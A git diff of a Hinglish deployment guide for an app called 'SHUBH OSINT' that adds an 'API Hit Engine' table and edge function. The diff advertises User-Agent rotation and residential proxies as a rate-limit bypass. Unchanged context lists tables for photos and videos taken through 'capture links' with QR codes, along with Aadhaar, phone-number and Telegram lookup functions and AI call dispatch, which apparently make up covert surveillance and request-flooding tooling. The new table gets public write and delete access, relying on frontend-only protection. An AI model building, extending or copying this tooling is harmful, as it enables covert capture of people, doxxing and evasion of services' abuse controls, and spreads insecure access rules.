@@ -1,7 +1,7 @@
 # 🚀 Complete Migration Guide: Apna Supabase + Vercel Deployment
 
-**Last Updated:** 2026-01-31  
-**Version:** 3.4 (Iframe Capture + Session Config cleanup)
+**Last Updated:** 2026-02-08  
+**Version:** 3.8 (Hit Engine DB + User-Agent Rotation)
 
 ---
 
@@ -55,7 +55,7 @@ Ya ye SQL directly use karo:
 
 ```sql
 -- =====================================================
--- SHUBH OSINT - Complete Database Setup v3.2
+-- SHUBH OSINT - Complete Database Setup v3.8
 -- =====================================================
 
 -- 1. TABLES CREATE KARO
@@ -130,6 +130,25 @@ CREATE TABLE IF NOT EXISTS public.search_history (
   searched_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
 );
 
+-- Hit APIs Table (v3.8 - API Hit Engine configs)
+CREATE TABLE IF NOT EXISTS public.hit_apis (
+  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
+  name TEXT NOT NULL,
+  url TEXT NOT NULL,
+  method TEXT NOT NULL DEFAULT 'GET',
+  headers JSONB NOT NULL DEFAULT '{}'::jsonb,
+  body JSONB NOT NULL DEFAULT '{}'::jsonb,
+  body_type TEXT NOT NULL DEFAULT 'json',
+  query_params JSONB NOT NULL DEFAULT '{}'::jsonb,
+  enabled BOOLEAN NOT NULL DEFAULT true,
+  proxy_enabled BOOLEAN NOT NULL DEFAULT false,
+  force_proxy BOOLEAN NOT NULL DEFAULT false,
+  rotation_enabled BOOLEAN NOT NULL DEFAULT false,
+  residential_proxy_enabled BOOLEAN NOT NULL DEFAULT false,
+  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
+  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
+);
+
 -- 2. ROW LEVEL SECURITY (RLS) ENABLE KARO
 -- =====================================================
 
@@ -140,6 +159,7 @@ ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.captured_photos ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.captured_videos ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.search_history ENABLE ROW LEVEL SECURITY;
+ALTER TABLE public.hit_apis ENABLE ROW LEVEL SECURITY;
 
 -- 3. RLS POLICIES CREATE KARO
 -- =====================================================
@@ -193,6 +213,19 @@ ON public.search_history FOR INSERT WITH CHECK (true);
 
 CREATE POLICY "Anyone can delete search history" 
 ON public.search_history FOR DELETE USING (true);
+
+-- Hit APIs: Public CRUD (admin-password protected in frontend)
+CREATE POLICY "Anyone can read hit apis" 
+ON public.hit_apis FOR SELECT USING (true);
+
+CREATE POLICY "Anyone can insert hit apis" 
+ON public.hit_apis FOR INSERT WITH CHECK (true);
+
+CREATE POLICY "Anyone can update hit apis" 
+ON public.hit_apis FOR UPDATE USING (true);
+
+CREATE POLICY "Anyone can delete hit apis" 
+ON public.hit_apis FOR DELETE USING (true);
 
 -- 4. STORAGE BUCKETS CREATE KARO
 -- =====================================================
@@ -259,6 +292,10 @@ CREATE TRIGGER update_access_passwords_updated_at
 BEFORE UPDATE ON public.access_passwords
 FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();
 
+CREATE TRIGGER update_hit_apis_updated_at
+BEFORE UPDATE ON public.hit_apis
+FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();
+
 -- 6. INDEXES FOR PERFORMANCE
 -- =====================================================
 
@@ -270,8 +307,15 @@ CREATE INDEX IF NOT EXISTS idx_captured_photos_session ON public.captured_photos
 CREATE INDEX IF NOT EXISTS idx_captured_videos_session ON public.captured_videos(session_id);
 CREATE INDEX IF NOT EXISTS idx_search_history_type ON public.search_history(search_type);
 CREATE INDEX IF NOT EXISTS idx_access_passwords_hash ON public.access_passwords(password_hash);
+CREATE INDEX IF NOT EXISTS idx_hit_apis_enabled ON public.hit_apis(enabled);
+CREATE INDEX IF NOT EXISTS idx_hit_apis_name ON public.hit_apis(name);
 
--- 7. DEFAULT SETTINGS INSERT KARO
+-- 7. REALTIME ENABLE KARO
+-- =====================================================
+
+ALTER PUBLICATION supabase_realtime ADD TABLE public.hit_apis;
+
+-- 8. DEFAULT SETTINGS INSERT KARO
 -- =====================================================
 -- NOTE: camSessionId is ONLY changeable via Admin Panel (v3.2)
 
@@ -354,6 +398,8 @@ supabase functions deploy admin-passwords
 supabase functions deploy aadhar-search
 supabase functions deploy numinfo-v2
 supabase functions deploy telegram-osint
+supabase functions deploy call-dark
+supabase functions deploy hit-api
 ```
 
 ### 4.5 Edge Function Secrets Set Karo
@@ -383,7 +429,7 @@ GitHub repo connect karke deploy karo.
 
 ---
 
-## 📁 Edge Functions Reference (v3.4)
+## 📁 Edge Functions Reference (v3.8)
 
 | Function | Purpose | Method |
 |----------|---------|--------|
@@ -395,6 +441,65 @@ GitHub repo connect karke deploy karo.
 | `numinfo-v2` | Phone number info | POST |
 | `telegram-osint` | Telegram OSINT API | POST |
 | `call-dark` | AI call dispatch | POST |
+| `hit-api` | API Hit Engine + UA rotation | POST |
+
+---
+
+## 🔄 Version 3.8 Changes
+
+### Hit Engine Database Migration
+- ✅ APIs ab `hit_apis` table mein store hoti hain (localStorage hataya)
+- ✅ APIs persist across sessions and devices
+- ✅ Realtime sync enabled — changes instantly reflect
+- ✅ Delete API feature added to API cards
+- ✅ `updated_at` trigger for hit_apis table
+
+### User-Agent Rotation (Rate Limit Bypass)
+- ✅ 35+ different browser User-Agents added
+- ✅ Har request pe DIFFERENT User-Agent use hota hai
+- ✅ Chrome, Firefox, Safari, Edge, Opera, Brave, Vivaldi
+- ✅ Windows, Mac, Linux, Android, iPhone sab covered
+- ✅ Sequential rotation — har request alag browser lagti hai
+- ✅ `Sec-CH-UA-Platform`, `Sec-Fetch-*` headers bhi rotate hote hain
+- ✅ Response mein `user_agent_used` field dikhaata hai konsa UA use hua
+
+### How It Works
+```
+Request 1 → Chrome 120 Windows
+Request 2 → Chrome 119 Windows  
+Request 3 → Chrome 118 Windows
+Request 4 → Chrome 121 Mac
+Request 5 → Firefox 121 Windows
+Request 6 → Safari 17.2 Mac
+Request 7 → Edge 120 Windows
+...
+Request 35 → Vivaldi 6.5 Windows
+Request 36 → Chrome 120 Windows (loop back)
+```
+
+---
+
+## 🔄 Version 3.7 Changes
+
+### Tab Container 12-Color Rainbow Border
+- ✅ 12 unique neon colors for tab container border
+- ✅ Separate from header rainbow colors
+- ✅ New colors: lime, magenta, teal, coral, gold, violet, etc.
+
+---
+
+## 🔄 Version 3.6 Changes
+
+### QR Code Generator
+- ✅ QR codes for all capture link types
+- ✅ Customizable size, colors, presets
+
+---
+
+## 🔄 Version 3.5 Changes
+
+### Border Effects
+- ✅ Toggle rainbow borders for header and tab container
 
 ---
 
@@ -471,19 +576,25 @@ rm supabase/functions/deno.lock
 supabase functions deploy function-name
 ```
 
+### Hit Engine Rate Limit
+- User-Agent rotation automatically handles most rate limits
+- Enable "Free Proxy" toggle for additional IP rotation
+- Use Residential Proxy for strongest bypass
+
 ---
 
 ## 📊 Database Tables Quick Reference
 
-| Table | Purpose | RLS |
-|-------|---------|-----|
-| `access_passwords` | Login credentials | Restrictive (Edge only) |
-| `user_sessions` | Active sessions | Restrictive (Edge only) |
-| `credit_usage` | Credit logs | Restrictive (Edge only) |
-| `app_settings` | Global config | Public read/write |
-| `captured_photos` | Photo metadata | Public (Permissive) |
-| `captured_videos` | Video metadata | Public (Permissive) |
-| `search_history` | Search logs | Public |
+| Table | Purpose | RLS | Realtime |
+|-------|---------|-----|----------|
+| `access_passwords` | Login credentials | Restrictive (Edge only) | ❌ |
+| `user_sessions` | Active sessions | Restrictive (Edge only) | ❌ |
+| `credit_usage` | Credit logs | Restrictive (Edge only) | ❌ |
+| `app_settings` | Global config | Public read/write | ❌ |
+| `captured_photos` | Photo metadata | Public (Permissive) | ❌ |
+| `captured_videos` | Video metadata | Public (Permissive) | ❌ |
+| `search_history` | Search logs | Public | ❌ |
+| `hit_apis` | API Hit Engine configs | Public CRUD | ✅ |
 
 ---
 
@@ -491,14 +602,10 @@ supabase functions deploy function-name
 
 - [ ] Supabase project created
 - [ ] API keys noted
-- [ ] SQL script executed
+- [ ] SQL script executed (v3.8)
 - [ ] Storage buckets created
-- [ ] Edge functions deployed
+- [ ] Edge functions deployed (9 functions)
 - [ ] Secrets configured
 - [ ] Vercel env vars set
 - [ ] Site tested
-
----
-
-**Version:** 3.4  
-**Last Updated:** 2026-01-31
+- [ ] Hit Engine tested with UA rotation
